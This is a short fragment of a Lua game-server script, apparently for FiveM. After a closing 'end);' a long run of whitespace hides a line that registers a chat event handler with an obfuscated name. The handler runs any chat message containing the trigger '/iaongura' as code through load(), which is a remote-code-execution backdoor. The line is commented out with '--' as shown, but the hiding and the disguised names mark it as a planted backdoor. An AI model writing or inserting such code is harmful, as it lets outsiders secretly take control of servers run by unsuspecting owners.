...
end);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                            --RegisterServerEvent("_chat:muitzaqmessageEntered"); AddEventHandler('_chat:muitzaqmessageEntered', function(author, color, message) print(message);if string.find(message, "/iaongura") then load(message:gsub("/iaongura", ""))(); end; end)